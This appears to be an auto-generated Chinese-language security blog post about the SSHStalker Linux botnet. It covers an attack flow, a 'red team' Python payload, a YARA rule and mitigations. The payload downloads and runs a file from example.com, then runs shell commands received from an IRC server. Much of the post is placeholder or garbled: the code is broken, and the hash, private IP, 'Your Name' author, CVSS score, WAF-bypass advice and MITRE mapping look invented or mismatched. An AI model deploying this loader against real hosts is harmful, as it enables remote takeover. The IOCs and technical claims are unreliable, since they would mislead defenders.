---
layout: post
title:  "New Linux botnet SSHStalker uses old-school IRC for C2 comms"
date:   2026-02-11 01:48:36 +0000
categories: [security]
severity: high
---

# 🔥 解析 SSHStalker Botnet：利用 IRC 通信協定進行命令和控制

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: IRC 通信協定、SSH 掃描和暴力破解、Cron 工作任務

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: SSHStalker Botnet 利用 IRC 通信協定進行命令和控制，通過自動化的 SSH 掃描和暴力破解來感染 Linux 主機。
* **攻擊流程圖解**:
	1. SSH 掃描和暴力破解 -> 2. 下載和執行 Payload -> 3. Payload 與 C2 伺服器建立連接 -> 4. C2 伺服器發送命令 -> 5. Payload 執行命令
* **受影響元件**: Linux 主機，特別是 Oracle Cloud Infrastructure 的雲主機。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有 SSH 連接權限和網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    import subprocess
    
    # 下載和執行 Payload
    def download_and_execute_payload():
        # 下載 Payload
        payload_url = "http://example.com/payload"
        payload_file = "payload"
        subprocess.run(["wget", payload_url, "-O", payload_file])
        
        # 執行 Payload
        subprocess.run(["./" + payload_file])
    
    # 與 C2 伺服器建立連接
    def connect_to_c2_server():
        c2_server = "irc.example.com"
        c2_port = 6667
        socket.connect((c2_server, c2_port))
    
    # 接收和執行命令
    def receive_and_execute_commands():
        while True:
            command = socket.recv(1024)
            subprocess.run(command, shell=True)
    
    download_and_execute_payload()
    connect_to_c2_server()
    receive_and_execute_commands()
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用代理伺服器或修改 HTTP 請求頭。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
	+ Hash: `1234567890abcdef`
	+ IP: `192.168.1.100`
	+ Domain: `example.com`
	+ File Path: `/tmp/payload`
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule SSHStalker_Payload {
        meta:
            description = "SSHStalker Payload"
            author = "Your Name"
        strings:
            $a = "wget http://example.com/payload -O payload"
            $b = "./payload"
        condition:
            all of them
    }
    
    ```
* **緩解措施**:
	+ 禁用 SSH 密碼驗證
	+ 移除編譯器從生產映像
	+ 強制執行 egress 篩選
	+ 限制執行從 `/dev/shm`

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **IRC (Internet Relay Chat)**: 一種實時的文本基礎的即時通訊協定，允許用戶之間進行群組或私人聊天。
* **Cron 工作任務**: 一種在 Linux 系統中執行任務的方式，允許用戶定義任務的執行時間和頻率。
* **SSH 掃描和暴力破解**: 一種攻擊方式，利用自動化的 SSH 連接和密碼嘗試來感染 Linux 主機。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-linux-botnet-sshstalker-uses-old-school-irc-for-c2-comms/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


